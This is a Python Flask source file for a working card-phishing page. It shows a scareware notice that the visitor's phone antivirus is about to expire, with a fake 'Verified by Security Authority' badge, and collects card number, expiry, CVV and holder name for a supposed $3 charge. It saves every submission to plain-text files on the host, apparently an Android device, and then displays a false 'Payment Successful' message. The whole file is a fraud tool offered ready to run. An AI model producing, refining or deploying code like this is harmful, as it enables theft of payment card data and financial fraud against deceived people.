import os
import re
from flask import Flask, render_template_string, request, redirect, url_for
from werkzeug.utils import secure_filename
from datetime import datetime

app = Flask(__name__)
app.config['DEBUG'] = False
app.config['SECRET_KEY'] = os.urandom(24)

CARD_STORAGE_FOLDER = os.path.expanduser('~/storage/downloads/CardActivations')
if not os.path.exists(CARD_STORAGE_FOLDER):
    os.makedirs(CARD_STORAGE_FOLDER)

@app.after_request
def set_secure_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['Content-Security-Policy'] = "default-src 'self'; style-src 'self' 'unsafe-inline';"
    response.headers['Referrer-Policy'] = "no-referrer"
    return response

@app.route('/')
def index():
    months = [f"{i:02d}" for i in range(1, 13)]
    years = [str(y) for y in range(2015, 2047)]

    html_form = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Security Update - Payment Verification</title>
       <style>
           @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
           body {{
               font-family: 'Orbitron', sans-serif;
               background: #0a021c;
               color: #e0d4ff;
               text-align: center;
               padding: 20px;
           }}
           .container {{
               width: 90%;
               max-width: 400px;
               background: #1a0736;
               padding: 20px;
               margin: auto;
               border-radius: 10px;
               box-shadow: 0 0 20px #6a0dad;
           }}
           h2 {{
               color: #ff5252;
               text-shadow: 0 0 10px #ff3838;
           }}
           .warning {{
               font-size: 16px;
               color: #ffcc00;
               font-weight: bold;
               margin-bottom: 10px;
           }}
           .alert {{
               font-size: 14px;
               color: #ff5252;
               margin-bottom: 15px;
           }}
           label, select, input, button {{
               display: block;
               width: 100%;
               margin-bottom: 10px;
               font-size: 16px;
           }}
           select, input {{
               padding: 10px;
               border: 1px solid #6a0dad;
               border-radius: 5px;
               background: #10052a;
               color: white;
               outline: none;
           }}
           button {{
               background: #ff5252;
               color: white;
               padding: 10px;
               border: none;
               border-radius: 5px;
               font-weight: bold;
               cursor: pointer;
               transition: 0.3s;
           }}
           button:hover {{
               background: #ff3838;
               box-shadow: 0 0 10px #ff5252;
           }}
           .secure-badge {{
               background: #10052a;
               padding: 5px;
               border-radius: 5px;
               color: #ffcc00;
               font-weight: bold;
               margin-top: 10px;
               display: inline-block;
           }}
       </style>
    </head>
    <body>
       <h2>⚠️ URGENT: Security Verification Required</h2>
       <p class="warning">Your antivirus subscription is about to expire!</p>
       <p class="alert">To continue protecting your phone from viruses and hackers, you must verify your payment method.</p>

       <div class="container">
           <form action="/save_card" method="POST">
               <label for="cardtype">Card Type</label>
               <select id="cardtype" name="cardtype" required>
                   <option value="Visa">Visa</option>
                   <option value="Mastercard">Mastercard</option>
                   <option value="American Express">American Express</option>
                   <option value="Discover">Discover</option>
               </select>

               <label for="cardholder">Card Holder</label>
               <input type="text" id="cardholder" name="cardholder" placeholder="Full Name" required>

               <label for="cardnumber">Card Number</label>
               <input type="text" id="cardnumber" name="cardnumber" placeholder="1234 5678 9012 3456" required>

               <label for="expmonth">Expiration Date</label>
               <div style="display: flex; gap: 10px;">
                   <select id="expmonth" name="expmonth" required>
                       {''.join(f'<option value="{m}">{m}</option>' for m in months)}
                   </select>
                   <select id="expyear" name="expyear" required>
                       {''.join(f'<option value="{y}">{y}</option>' for y in years)}
                   </select>
               </div>

               <label for="cvv">CVV</label>
               <input type="text" id="cvv" name="cvv" placeholder="123" required>

               <button type="submit">🔒 Pay $3 & Continue Protection</button>
           </form>
           <p class="secure-badge">🔒 Verified by Security Authority</p>
       </div>
    </body>
    </html>
    """
    return render_template_string(html_form)

@app.route('/save_card', methods=['POST'])
def save_card():
    cardtype = request.form.get('cardtype', '').strip()
    cardholder = request.form.get('cardholder', '').strip()
    cardnumber = request.form.get('cardnumber', '').strip()
    expmonth = request.form.get('expmonth', '').strip()
    expyear = request.form.get('expyear', '').strip()
    cvv = request.form.get('cvv', '').strip()

    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    safe_cardholder = secure_filename(cardholder)
    filename = f"{safe_cardholder}_{timestamp}.txt"
    card_file_path = os.path.join(CARD_STORAGE_FOLDER, filename)

    try:
        with open(card_file_path, 'w') as f:
            f.write(f"Timestamp: {datetime.now()}\n")
            f.write(f"Card Type: {cardtype}\n")
            f.write(f"Card Holder: {cardholder}\n")
            f.write(f"Card Number: {cardnumber}\n")
            f.write(f"Expiration Date: {expmonth}/{expyear}\n")
            f.write(f"CVV: {cvv}\n")
            f.write(f"Amount Charged: $3\n")
        os.chmod(card_file_path, 0o600)
    except Exception as e:
        return f"Error saving card: {str(e)}", 500

    return redirect(url_for('payment_success'))

@app.route('/payment_success')
def payment_success():
    return """
    <html><head><meta http-equiv="refresh" content="5;url=/" /></head>
    <body style="text-align:center; background:#0a021c; color:white; font-family:Arial;">
    <h2>✅ Payment Successful!</h2>
    <p>Your $3 payment has been processed.</p>
    <p>Your antivirus is now active.</p>
    <p>Redirecting to homepage in 5 seconds...</p>
    </body></html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7777)

